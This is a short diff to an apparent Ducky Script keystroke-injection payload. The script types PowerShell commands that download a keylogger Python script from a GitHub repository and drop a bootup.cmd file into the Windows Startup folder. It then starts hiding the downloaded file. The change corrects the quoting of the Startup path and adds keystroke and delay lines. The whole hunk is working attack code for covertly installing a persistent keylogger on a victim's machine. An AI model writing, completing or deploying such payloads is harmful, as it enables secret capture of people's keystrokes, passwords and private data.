@@ -40,7 +40,9 @@ DELAY 200
 STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile $dest
 ENTER
 DELAY 200
-STRING Invoke-WebRequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/bootup.cmd" -OutFile C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+STRING Invoke-WebRequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/bootup.cmd" -OutFile 'C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+ENTER
+DELAY 200
 STRING $HIDE=Get-Item $dest -Force
 ENTER
 DELAY 200
